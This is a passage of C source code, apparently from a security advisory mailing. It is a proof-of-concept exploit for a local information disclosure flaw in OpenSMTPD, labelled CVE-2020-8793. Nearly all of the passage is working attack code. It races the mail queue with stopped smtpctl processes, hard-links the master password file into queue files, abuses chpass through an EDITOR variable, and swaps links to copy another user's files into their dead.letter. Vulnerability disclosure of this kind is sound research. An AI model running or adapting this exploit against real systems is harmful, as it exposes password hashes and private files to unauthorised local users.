    if (pipe(fds) != 0) die();
    const pid_t pid = fork();
    if (pid <= -1) die();

    const int fd = fds[!pid];
    if (close(fds[!!pid]) != 0) die();

    if (pid != 0) {
        const t_stopper stopper = { .stop = stop, .pid = pid, .fd = fd };
        return stopper;
    }

    int proc_mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_RUID, uid, sizeof(struct kinfo_proc), 0 };
    size_t proc_len = 0;
    if (sysctl(proc_mib, 6, NULL, &proc_len, NULL, 0) == -1) die();
    if (proc_len <= 0) proc_len = sizeof(struct kinfo_proc);
    if (proc_len > ((size_t)1 << 20)) die();

    const size_t proc_max = 0x10 * proc_len;
    void * const proc_buf = malloc(proc_max);
    if (proc_buf == NULL) die();
    if (proc_mib[5] != 0) die();
    proc_mib[5] = proc_max / sizeof(struct kinfo_proc);

    for (;;) {
        proc_len = proc_max;
        if (sysctl(proc_mib, 6, proc_buf, &proc_len, NULL, 0) == -1) die();
        if (proc_len <= 0) {
            if (stop) die();
            continue;
        }
        if (proc_len >= proc_max) die();

        const struct kinfo_proc * kp;
        if (proc_len % sizeof(*kp) != 0) die();
        for (kp = proc_buf; kp != proc_buf + proc_len; kp++) {
            if (*(const uint64_t *)kp->p_comm != *(const uint64_t *)"smtpctl") continue;
            if (kp->p_flag & P_SUSPSIG) continue;

            const pid_t pid = kp->p_pid;
            if (stop && kill(pid, SIGSTOP) != 0) continue;

            const int argv_mib[] = { CTL_KERN, KERN_PROC_ARGS, pid, KERN_PROC_ARGV };
            static char argv_buf[ARG_MAX];
            size_t argv_len = sizeof(argv_buf);
            if (sysctl(argv_mib, 4, argv_buf, &argv_len, NULL, 0) == -1) {
                continue;
            }
            if (argv_len <= sizeof(char *)) {
                if (stop) die();
                continue;
            }
            if (argv_len >= sizeof(argv_buf)) die();

            const char * const * const av = (const void *)argv_buf;
            size_t ac;
            for (ac = 0; av[ac] != NULL; ac++) {
                switch (ac) {
                case 0:
                    if (strcmp(av[ac], "sendmail") != 0) die();
                    continue;
                case 1:
                    if (strcmp(av[ac], "-S") != 0) die();
                    continue;
                case 2:
                    if (stop) {
                        if (strncmp(av[ac], PATH_SPOOL PATH_OFFLINE,
                                     sizeof(PATH_SPOOL PATH_OFFLINE)-1) != 0) die();
                        static const char ** stopped;
                        static size_t i_stopped, n_stopped;

                        size_t i;
                        for (i = 0; i < i_stopped; i++) {
                            if (strcmp(av[ac], stopped[i]) == 0) break;
                        }
                        if (i < i_stopped) break;
                        if (i != i_stopped) die();

                        if (i_stopped >= n_stopped) {
                            if (i_stopped != n_stopped) die();
                            if (n_stopped > ((size_t)1 << 20)) die();
                            n_stopped += ((size_t)1 << 10);
                            stopped = reallocarray(stopped, n_stopped, sizeof(*stopped));
                            if (stopped == NULL) die();
                        }
                        if (i_stopped >= n_stopped) die();
                        stopped[i_stopped] = strdup(av[ac]);
                        if (stopped[i_stopped] == NULL) die();
                        i_stopped++;
                    }
                    const size_t len = strlen(av[ac]) + 1;
                    if (write(fd, &pid, sizeof(pid)) != (ssize_t)sizeof(pid)) die();
                    if (write(fd, av[ac], len) != (ssize_t)len) die();
                    break;
                default:
                    die();
                }
                break;
            }
        }
    }
    die();
}

static void
kill_stopper(const t_stopper stopper)
{
    kill_wait(stopper.pid);
    if (close(stopper.fd) != 0) die();
}

typedef struct {
    int kill;
    pid_t pid;
    char * args;
} t_stopped;

static t_stopped
wait_stopped(const t_stopper stopper)
{
    pid_t pid = 0;
    if (read(stopper.fd, &pid, sizeof(pid)) != (ssize_t)sizeof(pid)) die();
    if (pid <= 0) die();

    static char buf[ARG_MAX];
    size_t len = 0;
    for (;;) {
        if (len >= sizeof(buf)) die();
        const ssize_t nbr = read(stopper.fd, buf + len, 1);
        if (nbr <= 0) die();
        len += nbr;
        if (buf[len - 1] == '\0') break;
    }
    if (len <= 0) die();
    if (memchr(buf, '\0', len) != buf + len - 1) die();

    char * const args = strdup(buf);
    if (args == NULL) die();
    const t_stopped stopped = { .kill = stopper.stop, .pid = pid, .args = args };
    return stopped;
}

static void
kill_free_stopped(const t_stopped stopped)
{
    if (stopped.kill && kill(stopped.pid, SIGKILL) != 0) die();
    free(stopped.args);
}

static void
make_stopper_file(const char * const file)
{
    const off_t file_size = (off_t)1 << 30;
    const off_t line_size = (off_t)1 << 20;

    struct stat sb;
    if (lstat(file, &sb) != 0) die();
    if (!S_ISREG(sb.st_mode)) die();
    if (sb.st_size <= 0) die();
    if (sb.st_size >= line_size) {
        if (sb.st_size > file_size) return;
        die();
    }

    const int fd = open(file, O_WRONLY | O_NOFOLLOW, 0);
    if (fd <= -1) die();
    off_t l;
    for (l = 1; l <= file_size / line_size; l++) {
        if (lseek(fd, line_size, SEEK_END) <= l * line_size) die();
        if (write(fd, "\n", 1) != 1) die();
    }
    if (close(fd) != 0) die();
}

static size_t
find_stopped_file(const char * const * const files, const size_t n_files,
    const t_stopped stopped)
{
    size_t f;
    for (f = 0; f < n_files; f++) {
        if (strcmp(files[f], stopped.args) == 0) {
            if (f >= n_files - 1) die();
            return f;
        }
    }
    die();
}

static void
disclose_masterpasswd(const size_t n_files)
{
    if (getuid() == 0) die();
    const char * const * const files = create_files(n_files);
    size_t i;
    for (i = 0; i < n_files - 1; i++) {
        make_stopper_file(files[i]);
    }

    t_stopped queue_stopped[OFFLINE_QUEUEMAX];
    size_t t = 0;
    size_t q;
    const t_stopper queue_stopper = fork_stopper(getuid());
    puts("ready");

    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
        queue_stopped[q] = wait_stopped(queue_stopper);
        const size_t f = find_stopped_file(files, n_files, queue_stopped[q]);
        printf("%zu (%zu)\n", f, q);
        if (f >= t) t = f + 1;
    }
    kill_stopper(queue_stopper);
    if (t < OFFLINE_QUEUEMAX) die();
    if (t >= n_files - 1) die();

    wait_sentinel(files, n_files);

    for (i = 0; i < n_files - 1; i++) {
        if (unlink(files[i]) != 0) die();
        if (i < t) continue;
        if (link(_PATH_MASTERPASSWD, files[i]) != 0) die();

        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            char * const argv[] = { "/usr/bin/chpass", NULL };
            char * const envp[] = { "EDITOR=echo '#' >>", NULL };
            execve(argv[0], argv, envp);
            die();
        }

        int status = 0;
        if (waitpid(pid, &status, 0) != pid) die();
        if (!WIFEXITED(status)) die();
        if (WEXITSTATUS(status) != 0) die();

        struct stat sb;
        if (lstat(files[i], &sb) != 0) die();
        if (!S_ISREG(sb.st_mode)) die();
        if (sb.st_nlink != 1) die();
        if (sb.st_uid != 0) die();
    }

    const t_stopper target_dumper = fork_stopper(0);
    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
        kill_free_stopped(queue_stopped[q]);
    }
    const t_stopped target_dump = wait_stopped(target_dumper);
    puts(target_dump.args);
    kill_free_stopped(target_dump);
    kill_stopper(target_dumper);

    for (i = t; i < n_files - 1; i++) {
        if (unlink(files[i]) != 0) die();
    }
    exit(EXIT_SUCCESS);
}

static void
make_stopper_files(const char * const * const files, const size_t n_files,
    const size_t begin_stoppers, const size_t n_stoppers)
{
    if (begin_stoppers >= n_files) die();
    if (n_stoppers > OFFLINE_QUEUEMAX) die();

    const size_t end_stoppers = begin_stoppers + 3 * n_stoppers;
    if (end_stoppers >= n_files) die();

    size_t f;
    for (f = begin_stoppers; f < end_stoppers; f++) {
        make_stopper_file(files[f]);
    }
}

typedef struct {
    pid_t pid;
    int fd;
} t_swapper;

static t_swapper
fork_swapper(const char * const target, const char * const file)
{
    struct stat sb;
    if (lstat(target, &sb) != 0) die();
    if (!S_ISREG(sb.st_mode)) die();
    if (sb.st_nlink != 1) die();

    int fds[2];
    if (pipe(fds) != 0) die();
    const pid_t pid = fork();
    if (pid <= -1) die();

    const int fd = fds[!pid];
    if (close(fds[!!pid]) != 0) die();

    if (pid != 0) {
        const t_swapper swapper = { .pid = pid, .fd = fd };
        return swapper;
    }

    if (unlink(file) != 0) die();
    if (write(fd, "A", 1) != 1) die();

    for (;;) {
        if (link(target, file) != 0) die();
        if (unlink(file) != 0) die();
    }
    die();
}

static void
wait_swapper(const t_swapper swapper)
{
    char buf[] = "whatever";
    if (read(swapper.fd, buf, sizeof(buf)) != 1) die();
    if (buf[0] != 'A') die();
}

static void
kill_swapper(const t_swapper swapper)
{
    kill_wait(swapper.pid);
    if (close(swapper.fd) != 0) die();
}

static void
disclose_deadletter(const size_t n_files, const char * const target)
{
    struct stat target_sb;
    if (target[0] != '/') die();
    if (lstat(target, &target_sb) != 0) die();
    if (!S_ISREG(target_sb.st_mode)) die();
    if (target_sb.st_nlink != 1) die();

    const uid_t target_uid = target_sb.st_uid;
    if (target_uid == getuid()) die();
    const struct passwd * const target_pw = getpwuid(target_uid);
    if (target_pw == NULL) die();

    static char deadletter[PATH_MAX];
    snprintf(deadletter, sizeof(deadletter), "%s/dead.letter", target_pw->pw_dir);
    struct stat deadletter_sb;
    if (lstat(deadletter, &deadletter_sb) != 0) {
        if (errno != ENOENT) die();
        memset(&deadletter_sb, 0, sizeof(deadletter_sb));
    }

    const char * const * const files = create_files(n_files);
    make_stopper_files(files, n_files, 0, OFFLINE_QUEUEMAX);
    const t_stopper queue_stopper = fork_stopper(getuid());
    puts("ready");

    t_stopped queue_stopped[OFFLINE_QUEUEMAX];
    size_t t = 0;
    size_t q;
    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
        queue_stopped[q] = wait_stopped(queue_stopper);
        const size_t f = find_stopped_file(files, n_files, queue_stopped[q]);
        printf("%zu (%zu)\n", f, q);
        if (f >= t) t = f + 1;
    }
    if (t < OFFLINE_QUEUEMAX) die();
    if (t >= n_files - 1) die();

    size_t i;
    for (i = 0; i < t; i++) {
        if (unlink(files[i]) != 0) die();
    }

    wait_sentinel(files, n_files);
    const t_stopper target_dumper = fork_stopper(target_uid);

    for (;;) {
        make_stopper_files(files, n_files, t + 1, 1);
        const t_swapper swapper = fork_swapper(target, files[t]);
        wait_swapper(swapper);
        kill_free_stopped(queue_stopped[0]);
        queue_stopped[0] = wait_stopped(queue_stopper);
        kill_swapper(swapper);

        const size_t f = find_stopped_file(files, n_files, queue_stopped[0]);
        printf("%zu\n", f);
        if (f <= t) die();
        for (i = t; i <= f; i++) {
            if (unlink(files[i]) != 0) {
                if (errno != ENOENT) die();
                if (i != t) die();
            }
        }
        t = f + 1;

        struct stat sb;
        if (lstat(deadletter, &sb) != 0) {
            if (errno != ENOENT) die();
            memset(&sb, 0, sizeof(sb));
        }
        if (memcmp(&sb, &deadletter_sb, sizeof(sb)) != 0) break;
    }
    kill_stopper(queue_stopper);

    const t_stopped target_dump = wait_stopped(target_dumper);
    puts(target_dump.args);
    kill_free_stopped(target_dump);
    kill_stopper(target_dumper);

    for (i = t; i < n_files - 1; i++) {
        if (unlink(files[i]) != 0) die();
    }
    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
        kill_free_stopped(queue_stopped[q]);
    }

    char * const argv[] = { "/bin/ls", "-l", deadletter, NULL };
    char * const envp[] = { NULL };
    execve(argv[0], argv, envp);
    die();
}

int
main(const int argc, const char * const argv[])
{
    setlinebuf(stdout);
    puts("Local information disclosure in OpenSMTPD (CVE-2020-8793)");
    puts("Copyright (C) 2020 Qualys, Inc.");

    if (argc <= 1) die();
    const size_t n_files = strtoul(argv[1], NULL, 0);
    if (n_files <= OFFLINE_QUEUEMAX) die();
    if (n_files > ((size_t)1 << 20)) die();

    if (argc == 2) {
        disclose_masterpasswd(n_files);
        die();
    }
    if (argc == 3) {
        disclose_deadletter(n_files, argv[2]);
        die();
    }
    die();
}

--4Ckj6UjgE2iN1+kY--
